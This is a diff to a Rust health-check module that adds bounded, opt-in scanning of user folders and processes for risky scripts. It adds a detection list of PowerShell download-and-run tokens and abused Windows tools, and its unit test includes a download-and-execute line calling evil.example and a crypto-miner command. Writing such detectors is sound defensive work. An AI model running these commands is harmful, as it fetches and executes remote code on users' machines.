@@ -1,5 +1,5 @@
-//! Opt-in suspicious-activity indicators (script-host persistence / mining-like processes).
-//! Indicators only — never malware verdicts, kill, or quarantine.
+//! Opt-in script-risk indicators (persistence, processes, bounded user-folder scripts).
+//! Indicators only — never malware verdicts, kill, quarantine, or full-disk AV.
 
 use crate::types::*;
 use std::path::{Path, PathBuf};
@@ -51,6 +51,28 @@ const RISKY_PATH_TOKENS: &[&str] = &[
     "\\appdata\\local\\temp\\",
     "/appdata/local/temp/",
 ];
+
+const RISK_CONTENT_TOKENS: &[&str] = &[
+    "-enc",
+    "-encodedcommand",
+    "downloadstring",
+    "frombase64string",
+    "invoke-expression",
+    "iex(",
+    "iex ",
+    "http://",
+    "https://",
+    "new-object net.webclient",
+    "start-bitstransfer",
+    "bitsadmin",
+    "regsvr32",
+    "mshta ",
+    "wscript.shell",
+];
+
+const MAX_DISK_FILES: usize = 120;
+const MAX_DISK_DEPTH: u32 = 2;
+const MAX_DISK_BYTES: usize = 4096;
 
 #[derive(Debug, Error)]
 pub enum SuspiciousActivityError {
@@ -133,12 +155,22 @@ pub fn looks_script_host_command(command: &str) -> bool {
 
 pub fn looks_elevated_script_risk(command: &str) -> bool {
     let lower = command.to_ascii_lowercase();
-    lower.contains("-enc")
-        || lower.contains("-encodedcommand")
-        || lower.contains("downloadstring")
-        || lower.contains("http://")
-        || lower.contains("https://")
+    RISK_CONTENT_TOKENS.iter().any(|tok| lower.contains(tok))
         || RISKY_PATH_TOKENS.iter().any(|tok| lower.contains(tok))
+}
+
+/// True when script file content/name looks like download/exec or mining-adjacent risk.
+pub fn looks_risky_script_content(name: &str, content: &str) -> bool {
+    let hay = format!("{name}\n{content}").to_ascii_lowercase();
+    if RISK_CONTENT_TOKENS.iter().any(|tok| hay.contains(tok)) {
+        return true;
+    }
+    MINING_KEYWORDS.iter().any(|kw| hay.contains(kw))
+}
+
+/// Consent-gated callers use settings for health enrich; Protect “Run scan” may call this directly.
+pub fn run_script_risk_scan() -> SuspiciousActivitySnapshot {
+    scan_suspicious_activity()
 }
 
 pub fn looks_mining_like(name: &str, path: Option<&str>, cmdline: Option<&str>) -> bool {
@@ -267,6 +299,42 @@ fn apply_suspicious_activity_snapshot(report: &mut HealthReport, snapshot: Suspi
         bump_board_level(board, IntegrityBoardLevel::Caution);
     }
 
+    if snapshot.scanned && !snapshot.disk_hits.is_empty() {
+        let names: Vec<&str> = snapshot
+            .disk_hits
+            .iter()
+            .take(5)
+            .map(|hit| hit.name.as_str())
+            .collect();
+        board.indicators.push(IntegrityIndicator {
+            kind: IntegrityIndicatorKind::RiskyScriptFile,
+            severity: AlertLevel::Warning,
+            title: "Risky script files on disk".to_string(),
+            message: format!(
+                "Bounded folder scan found script files with download/exec or mining-like tokens ({}). Indicator only — not a full-disk antivirus verdict.",
+                names.join(", ")
+            ),
+            evidence: snapshot
+                .disk_hits
+                .iter()
+                .take(8)
+                .map(|hit| {
+                    format!(
+                        "{} @ {}{}",
+                        hit.name,
+                        hit.location,
+                        hit.detail
+                            .as_ref()
+                            .map(|d| format!(" ({d})"))
+                            .unwrap_or_default()
+                    )
+                })
+                .collect::<Vec<_>>()
+                .join("; "),
+        });
+        bump_board_level(board, IntegrityBoardLevel::Caution);
+    }
+
     board.indicator_count = board.indicators.len().min(u8::MAX as usize) as u8;
     board
         .not_checked
@@ -289,28 +357,42 @@ fn bump_board_level(board: &mut IntegrityBoardReport, at_least: IntegrityBoardLe
 fn scan_suspicious_activity() -> SuspiciousActivitySnapshot {
     let mut persistence_hits = scan_persistence_hits();
     let mut mining_hits = scan_mining_hits();
+    let mut disk_hits = scan_disk_script_hits();
+    // Also flag live script hosts with elevated risk tokens as persistence-adjacent.
+    for hit in scan_script_host_process_hits() {
+        if persistence_hits.len() >= 8 {
+            break;
+        }
+        if !persistence_hits.iter().any(|existing| existing.name == hit.name && existing.location == hit.location)
+        {
+            persistence_hits.push(hit);
+        }
+    }
     persistence_hits.truncate(8);
     mining_hits.truncate(8);
+    disk_hits.truncate(8);
 
-    let source = persistence_source_label();
-    let summary = match (persistence_hits.is_empty(), mining_hits.is_empty()) {
-        (true, true) => {
-            "Scanned persistence + processes; no script-host or mining-like indicators matched."
-                .to_string()
-        }
-        (false, true) => format!(
-            "Found {} script-host persistence indicator(s).",
-            persistence_hits.len()
-        ),
-        (true, false) => format!(
-            "Found {} mining-like process indicator(s).",
-            mining_hits.len()
-        ),
-        (false, false) => format!(
-            "Found {} persistence and {} mining-like indicator(s).",
-            persistence_hits.len(),
-            mining_hits.len()
-        ),
+    let source = scan_source_label();
+    let parts = [
+        (!persistence_hits.is_empty()).then(|| {
+            format!(
+                "{} persistence/script-host",
+                persistence_hits.len()
+            )
+        }),
+        (!mining_hits.is_empty()).then(|| format!("{} mining-like", mining_hits.len())),
+        (!disk_hits.is_empty()).then(|| format!("{} disk script", disk_hits.len())),
+    ];
+    let found: Vec<String> = parts.into_iter().flatten().collect();
+    let summary = if found.is_empty() {
+        "Bounded scan of persistence, processes, and high-risk user folders found no matching script-risk indicators. Absence does not mean the machine is clean."
+            .to_string()
+    } else {
+        format!(
+            "Found {} indicator group(s): {}. Indicator only — not antivirus.",
+            found.len(),
+            found.join("; ")
+        )
     };
 
     SuspiciousActivitySnapshot {
@@ -319,26 +401,153 @@ fn scan_suspicious_activity() -> SuspiciousActivitySnapshot {
         source,
         persistence_hits,
         mining_hits,
+        disk_hits,
         summary,
     }
 }
 
-fn persistence_source_label() -> String {
+fn scan_source_label() -> String {
     #[cfg(windows)]
     {
-        return "hkcu_run+startup_folder".to_string();
+        return "hkcu_run+startup+user_folders+processes".to_string();
     }
     #[cfg(target_os = "linux")]
     {
-        return "xdg_autostart+ps".to_string();
+        return "xdg_autostart+user_folders+ps".to_string();
     }
     #[cfg(target_os = "macos")]
     {
-        return "launch_agents+ps".to_string();
+        return "launch_agents+user_folders+ps".to_string();
     }
     #[cfg(not(any(windows, target_os = "linux", target_os = "macos")))]
     {
-        "suspicious_activity_partial".to_string()
+        "script_risk_partial".to_string()
+    }
+}
+
+fn scan_disk_script_hits() -> Vec<SuspiciousActivityHit> {
+    let mut hits = Vec::new();
+    let mut examined = 0usize;
+    for root in script_scan_roots() {
+        if !root.exists() {
+            continue;
+        }
+        walk_script_root(&root, 0, &mut examined, &mut hits);
+        if hits.len() >= 8 || examined >= MAX_DISK_FILES {
+            break;
+        }
+    }
+    hits
+}
+
+fn script_scan_roots() -> Vec<PathBuf> {
+    let mut roots = Vec::new();
+    #[cfg(windows)]
+    {
+        if let Some(profile) = std::env::var_os("USERPROFILE").map(PathBuf::from) {
+            roots.push(profile.join("Downloads"));
+            roots.push(profile.join("Desktop"));
+        }
+        if let Some(temp) = std::env::var_os("TEMP").map(PathBuf::from) {
+            roots.push(temp);
+        }
+        if let Some(local) = std::env::var_os("LOCALAPPDATA").map(PathBuf::from) {
+            roots.push(local.join("Temp"));
+        }
+    }
+    #[cfg(not(windows))]
+    {
+        if let Some(home) = std::env::var_os("HOME").map(PathBuf::from) {
+            roots.push(home.join("Downloads"));
+            roots.push(home.join("Desktop"));
+        }
+        if let Some(tmp) = std::env::var_os("TMPDIR").map(PathBuf::from) {
+            roots.push(tmp);
+        }
+        roots.push(PathBuf::from("/tmp"));
+    }
+    roots
+}
+
+fn walk_script_root(
+    dir: &Path,
+    depth: u32,
+    examined: &mut usize,
+    hits: &mut Vec<SuspiciousActivityHit>,
+) {
+    if hits.len() >= 8 || *examined >= MAX_DISK_FILES || depth > MAX_DISK_DEPTH {
+        return;
+    }
+    let Ok(entries) = std::fs::read_dir(dir) else {
+        return;
+    };
+    for entry in entries.flatten() {
+        if hits.len() >= 8 || *examined >= MAX_DISK_FILES {
+            return;
+        }
+        let path = entry.path();
+        let Ok(meta) = entry.metadata() else {
+            continue;
+        };
+        if meta.is_dir() {
+            if depth < MAX_DISK_DEPTH {
+                walk_script_root(&path, depth + 1, examined, hits);
+            }
+            continue;
+        }
+        if !meta.is_file() {
+            continue;
+        }
+        let ext = path
+            .extension()
+            .and_then(|e| e.to_str())
+            .unwrap_or("")
+            .to_ascii_lowercase();
+        if !SCRIPT_EXTS.iter().any(|e| *e == ext.as_str()) {
+            continue;
+        }
+        *examined += 1;
+        let name = path
+            .file_name()
+            .and_then(|s| s.to_str())
+            .unwrap_or("script")
+            .to_string();
+        let content = read_prefix(&path, MAX_DISK_BYTES);
+        if !looks_risky_script_content(&name, &content) {
+            continue;
+        }
+        hits.push(SuspiciousActivityHit {
+            name,
+            location: path.display().to_string(),
+            detail: Some(format!("risky .{ext} in user folder sample")),
+        });
+    }
+}
+
+fn read_prefix(path: &Path, max_bytes: usize) -> String {
+    use std::io::Read;
+    let Ok(mut file) = std::fs::File::open(path) else {
+        return String::new();
+    };
+    let mut buf = vec![0_u8; max_bytes];
+    let Ok(n) = file.read(&mut buf) else {
+        return String::new();
+    };
+    String::from_utf8_lossy(&buf[..n]).into_owned()
+}
+
+fn scan_script_host_process_hits() -> Vec<SuspiciousActivityHit> {
+    #[cfg(windows)]
+    {
+        return scan_windows_script_host_processes();
+    }
+    #[cfg(any(target_os = "linux", target_os = "macos"))]
+    {
+        return scan_unix_script_host_processes();
+    }
+    #[cfg(not(any(windows, target_os = "linux", target_os = "macos")))]
+    {
+        vec![]
     }
 }
 
@@ -453,7 +662,7 @@ fn windows_startup_dir() -> Option<PathBuf> {
 }
 
 #[cfg(windows)]
-fn scan_windows_mining_processes() -> Vec<SuspiciousActivityHit> {
+fn windows_process_csv() -> Option<String> {
     use crate::process::hidden_command;
     use std::process::Stdio;
 
@@ -465,25 +674,42 @@ fn scan_windows_mining_processes() -> Vec<SuspiciousActivityHit> {
         ])
         .stdout(Stdio::piped())
         .stderr(Stdio::null())
-        .output();
-
-    let Ok(output) = output else {
-        return vec![];
-    };
+        .output()
+        .ok()?;
     if !output.status.success() {
-        return vec![];
+        return None;
     }
-    let text = String::from_utf8_lossy(&output.stdout);
-    parse_process_csv_hits(&text)
+    Some(String::from_utf8_lossy(&output.stdout).into_owned())
 }
 
-fn parse_process_csv_hits(text: &str) -> Vec<SuspiciousActivityHit> {
+#[cfg(windows)]
+fn scan_windows_mining_processes() -> Vec<SuspiciousActivityHit> {
+    let Some(text) = windows_process_csv() else {
+        return vec![];
+    };
+    parse_process_csv_hits(&text, ProcessHitKind::Mining)
+}
+
+#[cfg(windows)]
+fn scan_windows_script_host_processes() -> Vec<SuspiciousActivityHit> {
+    let Some(text) = windows_process_csv() else {
+        return vec![];
+    };
+    parse_process_csv_hits(&text, ProcessHitKind::ElevatedScriptHost)
+}
+
+enum ProcessHitKind {
+    Mining,
+    ElevatedScriptHost,
+}
+
+fn parse_process_csv_hits(text: &str, kind: ProcessHitKind) -> Vec<SuspiciousActivityHit> {
     let mut hits = Vec::new();
     let mut lines = text.lines();
     let _header = lines.next();
     for line in lines {
         let cols = parse_csv_line(line);
-        if cols.len() < 1 {
+        if cols.is_empty() {
             continue;
         }
         let name = cols.first().map(|s| s.as_str()).unwrap_or("").trim();
@@ -492,7 +718,15 @@ fn parse_process_csv_hits(text: &str) -> Vec<SuspiciousActivityHit> {
         }
         let path = cols.get(1).map(|s| s.as_str()).filter(|s| !s.is_empty());
         let cmdline = cols.get(2).map(|s| s.as_str()).filter(|s| !s.is_empty());
-        if looks_mining_like(name, path, cmdline) {
+        let matched = match kind {
+            ProcessHitKind::Mining => looks_mining_like(name, path, cmdline),
+            ProcessHitKind::ElevatedScriptHost => {
+                let cmd = cmdline.unwrap_or("");
+                (looks_script_host_command(name) || looks_script_host_command(cmd))
+                    && looks_elevated_script_risk(cmd)
+            }
+        };
+        if matched {
             hits.push(SuspiciousActivityHit {
                 name: name.to_string(),
                 location: path.unwrap_or("(path unknown)").to_string(),
@@ -615,7 +849,7 @@ fn scan_macos_persistence() -> Vec<SuspiciousActivityHit> {
 }
 
 #[cfg(any(target_os = "linux", target_os = "macos"))]
-fn scan_unix_mining_processes() -> Vec<SuspiciousActivityHit> {
+fn scan_unix_process_lines() -> Vec<(String, String)> {
     use std::process::Command;
 
     let output = Command::new("ps")
@@ -628,21 +862,50 @@ fn scan_unix_mining_processes() -> Vec<SuspiciousActivityHit> {
         return vec![];
     }
     let text = String::from_utf8_lossy(&output.stdout);
-    let mut hits = Vec::new();
+    let mut rows = Vec::new();
     for line in text.lines().take(120) {
         let line = line.trim();
         if line.is_empty() {
             continue;
         }
         let (name, cmdline) = match line.split_once(char::is_whitespace) {
-            Some((n, rest)) => (n, rest.trim()),
-            None => (line, ""),
+            Some((n, rest)) => (n.to_string(), rest.trim().to_string()),
+            None => (line.to_string(), String::new()),
         };
-        if looks_mining_like(name, None, Some(cmdline)) {
+        rows.push((name, cmdline));
+    }
+    rows
+}
+
+#[cfg(any(target_os = "linux", target_os = "macos"))]
+fn scan_unix_mining_processes() -> Vec<SuspiciousActivityHit> {
+    let mut hits = Vec::new();
+    for (name, cmdline) in scan_unix_process_lines() {
+        if looks_mining_like(&name, None, Some(&cmdline)) {
             hits.push(SuspiciousActivityHit {
-                name: name.to_string(),
+                name,
                 location: "(process sample)".to_string(),
-                detail: Some(truncate_cmd(cmdline)),
+                detail: Some(truncate_cmd(&cmdline)),
+            });
+        }
+        if hits.len() >= 8 {
+            break;
+        }
+    }
+    hits
+}
+
+#[cfg(any(target_os = "linux", target_os = "macos"))]
+fn scan_unix_script_host_processes() -> Vec<SuspiciousActivityHit> {
+    let mut hits = Vec::new();
+    for (name, cmdline) in scan_unix_process_lines() {
+        if (looks_script_host_command(&name) || looks_script_host_command(&cmdline))
+            && looks_elevated_script_risk(&cmdline)
+        {
+            hits.push(SuspiciousActivityHit {
+                name,
+                location: "(process sample)".to_string(),
+                detail: Some(truncate_cmd(&cmdline)),
             });
         }
         if hits.len() >= 8 {
@@ -689,6 +952,19 @@ mod tests {
             "chrome",
             Some(r"C:\Program Files\Google\Chrome\chrome.exe"),
             Some("chrome.exe"),
+        ));
+    }
+
+    #[test]
+    fn detects_risky_script_content() {
+        assert!(looks_risky_script_content(
+            "payload.ps1",
+            "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a')",
+        ));
+        assert!(looks_risky_script_content("miner.bat", "xmrig --algo=rx"));
+        assert!(!looks_risky_script_content(
+            "backup.ps1",
+            "Write-Host 'hello'; Get-Date",
         ));
     }
 
